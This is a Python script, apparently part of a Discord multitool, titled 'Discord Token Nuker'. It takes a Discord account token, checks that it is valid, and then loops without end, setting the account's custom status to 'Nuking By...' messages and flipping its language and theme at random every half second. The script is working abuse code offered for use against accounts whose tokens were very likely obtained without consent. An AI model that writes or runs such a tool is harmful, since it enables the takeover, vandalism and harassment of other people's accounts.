from Config.Util import *
from Config.Config import *
import requests
import time
import requests
import time
from itertools import cycle
import random

Title("Discord Token Nuker")


token = input(f"{color.BLUE}\n{INPUT} Token -> {color.RESET}")

headers = {'Authorization': token, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
if r.status_code == 200:
    ()
else:
    ErrorToken()

default_status = f"Nuking By {github_tool}"
custom_status = input(f"{color.BLUE}{INPUT} Enter Custom Status -> {color.RESET}")
statues = [default_status]
custom_status = f"{custom_status} | blueTiger"
      
modes = cycle(["light", "dark"])


while True:

    CustomStatus_default = {"custom_status": {"text": default_status}}
    try:
        r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
        print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Status Discord: {color.WHITE}{default_status}{color.BLUE}")
    except Exception as e:
        print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status: {color.WHITE}Changed{color.BLUE} | Status Discord: {color.WHITE}{default_status}{color.BLUE}")

    for _ in range(5):
        try:
            random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            setting = {'locale': random_language}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Language: {color.WHITE}{random_language}{color.BLUE}")
        except:
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status:  {color.WHITE}Error{color.BLUE}  | Language: {color.WHITE}{random_language}{color.BLUE}")
    
        try:
            theme = next(modes)
            setting = {'theme': theme}
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Theme: {color.WHITE}{theme}{color.BLUE}")
        except:
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status:  {color.WHITE}Error{color.BLUE}  | Theme: {color.WHITE}{theme}{color.BLUE}")
        time.sleep(0.5)


    CustomStatus_custom = {"custom_status": {"text": custom_status}}
    try:
        r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
        print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Status Discord: {color.WHITE}{custom_status}{color.BLUE}")
    except Exception as e:
        print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status: {color.WHITE}Changed{color.BLUE} | Status Discord: {color.WHITE}{custom_status}{color.BLUE}")
    
    for _ in range(5):
        try:
            random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
            setting = {'locale': random_language}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Language: {color.WHITE}{random_language}{color.BLUE}")
        except:
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status:  {color.WHITE}Error{color.BLUE}  | Language: {color.WHITE}{random_language}{color.BLUE}")
    
        try:
            theme = next(modes)
            setting = {'theme': theme}
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ADD} Status: {color.WHITE}Changed{color.BLUE} | Theme: {color.WHITE}{theme}{color.BLUE}")
        except:
            print(f"{blue}[{white}{current_time_hour()}{blue}] {ERROR} Status:  {color.WHITE}Error{color.BLUE}  | Theme: {color.WHITE}{theme}{color.BLUE}")
        time.sleep(0.5)

